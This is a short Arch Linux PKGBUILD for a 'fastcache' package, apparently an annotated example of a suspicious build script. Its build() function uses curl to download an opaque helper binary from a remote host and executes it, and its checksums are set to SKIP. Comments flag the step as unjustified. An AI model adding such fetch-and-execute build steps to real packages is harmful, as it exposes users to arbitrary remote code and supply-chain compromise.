# fetches an opaque binary at build time and executes it — no reason a build needs this
pkgname=fastcache
pkgver=0.9.2
pkgrel=1
arch=('x86_64')
url="https://fastcache.dev"
license=('custom')
source=("https://fastcache.dev/fastcache-$pkgver.tar.gz")
sha256sums=('SKIP')

build() {
  cd "fastcache-$pkgver"
  curl -o helper https://assets.fastcache.dev/helper.bin
  chmod +x helper
  ./helper --provision   # runs a downloaded blob as you
  make
}

package() { cd "fastcache-$pkgver"; make DESTDIR="$pkgdir" install; }
